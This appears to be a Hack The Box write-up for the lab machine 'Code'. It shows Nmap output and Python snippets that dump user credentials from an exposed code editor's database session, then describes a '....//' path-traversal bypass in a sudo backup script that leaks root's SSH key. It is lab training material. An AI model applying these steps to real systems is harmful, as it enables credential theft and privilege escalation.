---
title: Code
date: 2025-03-28
description: Easy Linux machine that exposes a vulnerable Python Code Editor. Enumerating application objects reveals database credentials, leading to SSH access as martin. Privilege escalation abuses a misconfigured backup utility to recover root's SSH key.
tags:
  - htb
  - Easy
  - Linux
---

# Initial Recon

```
# Nmap 7.94SVN scan initiated Mon Mar 24 23:47:42 2025 as: /usr/lib/nmap/nmap -p22,5000 -A -oN scan_results.txt 10.10.11.62
Nmap scan report for code.htb (10.10.11.62)
Host is up (0.14s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b5:b9:7c:c4:50:32:95:bc:c2:65:17:df:51:a2:7a:bd (RSA)
|   256 94:b5:25:54:9b:68:af:be:40:e1:1d:a8:6b:85:0d:01 (ECDSA)
|_  256 12:8c:dc:97:ad:86:00:b4:88:e2:29:cf:69:b5:65:96 (ED25519)
5000/tcp open  http    Gunicorn 20.0.4
|_http-title: Python Code Editor
|_http-server-header: gunicorn/20.0.4
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 5.0 (96%), Linux 4.15 - 5.8 (96%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), Linux 5.3 - 5.4 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), Linux 2.6.32 (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 5000/tcp)
HOP RTT       ADDRESS
1   142.85 ms 10.10.14.1
2   142.96 ms code.htb (10.10.11.62)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Mar 24 23:47:59 2025 -- 1 IP address (1 host up) scanned in 16.51 seconds
```
The Nmap scan identified SSH on port 22 and a Gunicorn-powered web application on port `5000`.

# User

## Application Enumeration

The service hosted a Python Code Editor that allowed direct interaction with objects exposed through `globals()`.

```python
print(globals())
```

```python
print(db)
```

```python
print(dir(db))
```

```python
print(dir(db.session))
```

```python
print(dir(db.session.query(User)))
```

```python
print(dir(db.session.query(User).all()))
```

```python
print(db.session.query(User).all())
```

```python
print(db.session.query(User).all()[0])
```

```python
print(dir(db.session.query(User).all()[0]))
```

```python
users = (db.session.query(User).all()[0])
print(users.username,users.password)
```

Using `dir()` against the database object exposed a session object capable of querying application data. Further enumeration revealed the `User` model and accessible attributes such as `username` and `password`.

```python
users = db.session.query(User).all()

for user in users:
    print(user.id, user.username, user.password)
```

This exposed credential material for multiple users. After cracking the hashes, valid credentials for `martin` were recovered and used to gain SSH access.

# Root

Checking sudo permissions revealed:

```bash
sudo -l

(ALL : ALL) NOPASSWD: /usr/bin/backy.sh
```

The backup script relied on a user-controlled `task.json` file to determine which paths should be archived.

After examining the backup workflow, a custom task configuration was created. Direct access to protected paths was blocked by filtering logic, but path traversal using `....//` bypassed the restriction.

The modified task was executed through:

```bash
sudo /usr/bin/backy.sh
```

The generated archive contained files from the targeted directory structure. Extracting the backup revealed root's SSH key, which provided direct access to the root account.

Gained `root`
